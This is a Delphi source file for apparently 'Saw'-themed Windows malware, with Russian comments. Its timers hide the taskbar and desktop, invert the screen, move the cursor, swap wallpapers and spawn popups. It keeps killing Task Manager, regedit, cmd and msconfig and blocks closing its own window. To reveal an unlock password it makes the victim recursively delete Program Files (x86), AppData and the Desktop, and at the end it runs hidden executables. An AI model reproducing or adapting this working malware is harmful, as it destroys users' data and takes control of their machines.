unit Main;

interface

uses
  Winapi.Windows, Winapi.Messages, SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.StdCtrls, Vcl.MPlayer, Registry, Tlhelp32, ShellAPI,
  Vcl.ComCtrls, Vcl.Buttons;

type
  TForm2 = class(TForm)
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    Label1: TLabel;
    Timer: TTimer;
    Payload1: TTimer;
    MediaPlayer1: TMediaPlayer;
    Cursor: TTimer;
    ActivePayloads: TTimer;
    WallChange: TTimer;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Edit1: TEdit;
    Button1: TButton;
    GroupBox3: TGroupBox;
    Edit2: TEdit;
    Button2: TButton;
    GroupBox4: TGroupBox;
    Popup: TTimer;
    Text: TTimer;
    Label5: TLabel;
    GroupBox5: TGroupBox;
    Edit3: TEdit;
    Label6: TLabel;
    Panel1: TPanel;
    ProgressBar1: TProgressBar;
    GroupBox6: TGroupBox;
    Check: TTimer;
    SpeedButton1: TSpeedButton;
    Label7: TLabel;
    Label8: TLabel;
    GroupBox7: TGroupBox;
    Button3: TButton;
    Button4: TButton;
    Inverse: TTimer;
    Button5: TButton;
    Button6: TButton;
    Label9: TLabel;
    Check2: TTimer;
    KillApp: TTimer;
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure TimerTimer(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure CursorTimer(Sender: TObject);
    procedure Payload1Timer(Sender: TObject);
    procedure ActivePayloadsTimer(Sender: TObject);
    procedure WallChangeTimer(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure BlockAppsTimer(Sender: TObject);
    procedure PopupTimer(Sender: TObject);
    procedure TextTimer(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure CheckTimer(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure InverseTimer(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Check2Timer(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure KillAppTimer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;
  j,h:integer;
  password:integer;
  val:integer;
implementation

uses Popup1, Popup2, Unblock;


{$R *.dfm}

function GetUserFromWindows: string;
var
  UserName : string;
  UserNameLen : Dword;
begin
  UserNameLen := 255;
  SetLength(userName, UserNameLen);
  if GetUserName(PChar(UserName), UserNameLen) then
    Result := Copy(UserName,1,UserNameLen - 1)
  else
    Result := 'Unknown';
end;

function FullRemoveDir(Dir: string; DeleteAllFilesAndFolders,
  StopIfNotAllDeleted, RemoveRoot: boolean): Boolean;
var
  i: Integer;
  SRec: TSearchRec;
  FN: string;
begin
  Result := False;
  if not DirectoryExists(Dir) then
    exit;
  Result := True;
  // Добавляем слэш в конце и задаем маску - "все файлы и директории"
  Dir := IncludeTrailingBackslash(Dir);
  i := FindFirst(Dir + '*', faAnyFile, SRec);
  try
    while i = 0 do
    begin
      // Получаем полный путь к файлу или директорию
      FN := Dir + SRec.Name;
      // Если это директория
      if SRec.Attr = faDirectory then
      begin
        // Рекурсивный вызов этой же функции с ключом удаления корня
        if (SRec.Name <> '') and (SRec.Name <> '.') and (SRec.Name <> '..') then
        begin
          if DeleteAllFilesAndFolders then
            FileSetAttr(FN, faArchive);
          Result := FullRemoveDir(FN, DeleteAllFilesAndFolders,
            StopIfNotAllDeleted, True);
          if not Result and StopIfNotAllDeleted then
            exit;
        end;
      end
      else // Иначе удаляем файл
      begin
        if DeleteAllFilesAndFolders then
          FileSetAttr(FN, faArchive);
        Result := SysUtils.DeleteFile(FN);
        if not Result and StopIfNotAllDeleted then
          exit;
      end;
      // Берем следующий файл или директорию
      i := FindNext(SRec);
    end;
  finally
    SysUtils.FindClose(SRec);
  end;
  if not Result then
    exit;
  if RemoveRoot then // Если необходимо удалить корень - удаляем
    if not RemoveDir(Dir) then
      Result := false;
end;

function KillTask(ExeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
      Result := Integer(TerminateProcess(
                        OpenProcess(PROCESS_TERMINATE,
                                    BOOL(0),
                                    FProcessEntry32.th32ProcessID),
                                    0));
     ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

procedure ShowDesktop(const YesNo : boolean);
var h : THandle;
begin
 h := FindWindow('ProgMan', nil);
 h := GetWindow(h, GW_CHILD);
 if YesNo = True then
   ShowWindow(h, SW_SHOW)
 else
   ShowWindow(h, SW_HIDE);
end;

procedure SetWallpaper(sWallpaperBMPPath: string; bTile: boolean);
var

  reg: TRegIniFile;
begin
  //     Изменяем ключи реестра
  //     HKEY_CURRENT_USER
  //     Control Panel\Desktop
  //     TileWallpaper (REG_SZ)
  //     Wallpaper (REG_SZ)

  reg := TRegIniFile.Create('Control Panel\Desktop');
  with reg do
  begin
    WriteString('', 'Wallpaper',
      sWallpaperBMPPath);
    if (bTile) then
    begin
      WriteString('', 'TileWallpaper', '1');
    end
    else
    begin
      WriteString('', 'TileWallpaper', '0');
    end;
  end;
  reg.Free;
  // Оповещаем всех о том, что мы изменили системные настройки
  SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, nil, SPIF_SENDWININICHANGE);
end;

procedure TForm2.ActivePayloadsTimer(Sender: TObject);
begin
if(label1.Caption = '4:20') then Payload1.Enabled := true;
if(label1.Caption = '4:5') then Inverse.Enabled := true;
if(label1.Caption = '4:0') then Cursor.Enabled := true;
if(label1.Caption = '3:45') then WallChange.Enabled := true;
if(label1.Caption = '3:30') then Popup.Enabled := True;
if(label1.Caption = '3:20') then Text.Enabled := true;
if(label1.Caption = '0:59')
then
begin
  Payload1.Interval := 500;
  Inverse.Interval := 1000;
  Cursor.Interval := 1500;
  WallChange.Interval := 1;
  Text.Interval := 3500;
  Popup.Interval := 500;
end;
if(label1.Caption = '0:10')
then
begin
  Inverse.Interval := 500;
  Payload1.Interval := 1;
  Cursor.Interval := 500;
  WallChange.Interval := 1;
  Text.Interval := 1000;
  Popup.Interval := 1;
end;
if label1.Caption = '0:0'
then
begin
  Timer.Enabled := false;
  Cursor.Enabled := false;
  Popup.Enabled := false;
  WallChange.Enabled := false;
  Payload1.Enabled := false;
  killApp.Enabled := false;
  ShellExecute(Handle, 'open','c:\windows\help\End.exe', nil, nil,SW_HIDE);
end;

end;

procedure TForm2.BlockAppsTimer(Sender: TObject);
begin
KillTask('regedit.exe');
KillTask('resmon.exe');
KillTask('cmd.exe');
end;

procedure TForm2.Button1Click(Sender: TObject);
begin
if (Edit1.Text = '628981119')
then
begin
GroupBox1.Enabled := False;
Edit1.Enabled := False;
Button1.Enabled := False;
GroupBox4.Visible := True;
GroupBox4.Enabled := True;
Check.Enabled := true;
End
else ShowMessage('Ой, это не то число попробуй другое');
end;

procedure TForm2.Button2Click(Sender: TObject);
begin
if Edit2.Text = IntToStr(password)
then
begin
  Timer.Enabled := false;
  Cursor.Enabled := false;
  Popup.Enabled := false;
  WallChange.Enabled := false;
  Payload1.Enabled := false;
  KillApp.Enabled := false;
  Inverse.Enabled := false;
  Text.Enabled := false;
  Form2.Hide;
  ShowMessage('Да ладно, ты смог.');
  ShowMessage('Я свое обещание сдерживаю');
  ShowMessage('Ты прошел мои испытания, и я оставлю тебя в покое');
  Form2.Hide;
  Form2.Close;
  Form6.Show;
  Form4.Hide;
  Form5.Hide;
end
else
begin
  ShowMessage('Ой ты поспешил');
end;

end;

procedure TForm2.Button3Click(Sender: TObject);
begin
Button3.Enabled:= false;
FullRemoveDir('C:\Program Files (x86)', true, true, true)
end;

procedure TForm2.Button4Click(Sender: TObject);
begin
Button4.Enabled := false;
ShellExecute(Handle, 'open',
'c:\windows\DelActivate.exe', nil, nil,
SW_HIDE);
end;

procedure TForm2.Button5Click(Sender: TObject);
begin
Button5.Enabled := false;
FullRemoveDir('C:\Users\'+GetUserFromWindows+'\AppData',true,true,true)
end;

procedure TForm2.Button6Click(Sender: TObject);
begin
Button6.Enabled := false;
FullRemoveDir('C:\Users\'+GetUserFromWindows+'\Desktop',true,true,true)
end;

procedure TForm2.Check2Timer(Sender: TObject);
begin
if Button3.Enabled = false
then
begin
if Button4.Enabled = false
then
begin
if Button5.Enabled = false
then
begin
if Button6.Enabled = false then Edit3.Text := IntToStr(password) else
end;
end;
end;
end;

function processExists(exeFileName: string): Boolean;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := False;
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
    begin
      Result := True;
    end;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function CheckKill: string;
begin
if processExists('mspaint.exe') then KillTask('mspaint.exe');
if processExists('regedit.exe') then KillTask('regedit.exe');
if processExists('iexplore.exe') then KillTask('iexplore.exe');
if processExists('sidebar.exe') then KillTask('sidebar.exe');
if processExists('osk.exe') then KillTask('osk.exe');
if processExists('StikyNot.exe') then KillTask('StikyNot.exe');
if processExists('wmplayer.exe') then KillTask('wmplayer.exe');
if processExists('calc.exe') then KillTask('calc.exe');
if processExists('cmd.exe') then KillTask('cmd.exe');
if processExists('taskmgr.exe') then KillTask('taskmgr.exe');
if processExists('taskschd.msc') then KillTask('taskschd.msc');
if processExists('taskschd.exe') then KillTask('taskschd.exe');
if processExists('msconfig.exe') then KillTask('msconfig.exe');
end;

procedure TForm2.CheckTimer(Sender: TObject);
begin
if(ProgressBar1.Position = 600)
then
begin
Panel1.Enabled := false;
GroupBox3.Visible := True;
GroupBox6.Visible := True;
end;
end;

procedure TForm2.CursorTimer(Sender: TObject);
var
x,y:integer;
begin
randomize;
x:=random(1600);
y:=random(900);
setcursorpos(x,y);
end;

procedure TForm2.FormActivate(Sender: TObject);
var
oneactivate: integer;
begin
if oneactivate = 1
then
else
begin
ActivePayloads.Enabled:=true;
Timer.Enabled:= true;
KillApp.Enabled := true;
//Edit3.Text := IntToStr(password); //debug
oneactivate:= 1;
end;
end;

procedure TForm2.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
CanClose := false;
end;


procedure TForm2.FormCreate(Sender: TObject);
begin
randomize; //Подключение рандома
val:= 1;
password:=random(900000000000); //Генерация и сохранение пароля в переменную
j := 300;//Количество времени
ProgressBar1.Max := 600;//P.s Чем больше значение тем дольше нужно нажимать на кнопку
end;

procedure TForm2.InverseTimer(Sender: TObject);
begin
 BitBlt(GetDC(0), 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), GetDC(0), 0, 0, NOTSRCCOPY);
end;

procedure TForm2.KillAppTimer(Sender: TObject);
begin
CheckKill;
end;

procedure TForm2.Payload1Timer(Sender: TObject);
var
  num:integer;
  Wnd: THandle;
  Wnd1: THandle;
  Wnd2: THandle;
  Wnd3: THandle;
  Wnd4: THandle;
  Wnd5: THandle;
  Wnd6: THandle; { объявляем переменные }
  int: integer;
begin
randomize;
num:=random(3);
if(num = 0)
then
begin
  Wnd := FindWindow('Shell_TrayWnd',nil);
  ShowWindow( FindWindow( 'Shell_TrayWnd', nil ), SW_HIDE); //прячем панель задач
  ShowWindow( FindWindow( 'Button', 'Пуск' ), SW_HIDE); //прячем кнопку пуск аналогично как и в ХР
  ShowWindow( FindWindow( 'DV2ControlHost', 'Меню "Пуск"' ), SW_HIDE);
end
else
begin
  if(num = 1)
  then
  begin
   ShowDesktop(false);
  end
  else
  begin
    if(num = 2)
    then
    begin
      Wnd4 := FindWindow('Shell_TrayWnd',nil);
      ShowWindow( FindWindow( 'Shell_TrayWnd', nil ), SW_show); //показываем панель задач
      ShowWindow( FindWindow( 'Button', 'Пуск' ), SW_show); //показываем кнопку пуск аналогично как и в ХР
    end
    else
    begin
      if(num = 3)
      then
      begin
        ShowDesktop(true);
      end;
    end;
  end;
end;

end;

procedure TForm2.PopupTimer(Sender: TObject);
var
num: integer;
begin
randomize;
num:=random(2);
if num = 0 then Application.CreateForm(TForm6, Form6);
if num = 1 then Application.CreateForm(TForm5, Form5);
end;

procedure TForm2.SpeedButton1Click(Sender: TObject);
begin
val:= val + 1;
ProgressBar1.Position := val;
end;

procedure TForm2.TextTimer(Sender: TObject);
var
text: integer;
begin
randomize;
text:=random(5);
if text = 0 then ShellExecute(Handle, 'open', 'c:\windows\notepad.exe', 'c:\windows\debug\1.txt', nil,SW_SHOWNORMAL)
else if text = 1 then ShellExecute(Handle, 'open', 'c:\windows\notepad.exe', 'c:\windows\debug\2.txt', nil,SW_SHOWNORMAL)
else if text = 2 then ShellExecute(Handle, 'open', 'c:\windows\notepad.exe', 'c:\windows\debug\3.txt', nil,SW_SHOWNORMAL)
else if text = 3 then ShellExecute(Handle, 'open', 'c:\windows\notepad.exe', 'c:\windows\debug\4.txt', nil,SW_SHOWNORMAL)
else if text = 4 then ShellExecute(Handle, 'open', 'c:\windows\notepad.exe', 'c:\windows\debug\5.txt', nil,SW_SHOWNORMAL)
end;

procedure TForm2.TimerTimer(Sender: TObject);
var

M,S:Integer;

begin

j := j - 1;


M := (J - H*3600) div 60;

S := J - H*3600 - M*60;

label1.Caption := IntToStr(M) + ':' + IntToStr(S);

if j = 0 then

begin

Timer.Enabled := False;



end;
end;

procedure TForm2.WallChangeTimer(Sender: TObject);
var
 wall:integer;
begin
randomize;
wall:=random(9);
if wall = 0 then SetWallpaper('C:\windows\saw1.jpg',false)
else if wall = 1 then SetWallpaper('C:\windows\saw2.jpg',false)
else if wall = 2 then SetWallpaper('C:\windows\saw3.jpg',false)
else if wall = 3 then SetWallpaper('C:\windows\saw4.jpg',false)
else if wall = 4 then SetWallpaper('C:\windows\saw5.jpg',false)
else if wall = 5 then SetWallpaper('C:\windows\saw6.jpg',false)
else if wall = 6 then SetWallpaper('C:\windows\saw7.jpg',false)
else if wall = 7 then SetWallpaper('C:\windows\saw8.bmp',false)
else if wall = 8 then SetWallpaper('C:\image.jpg',false)
end;

end.
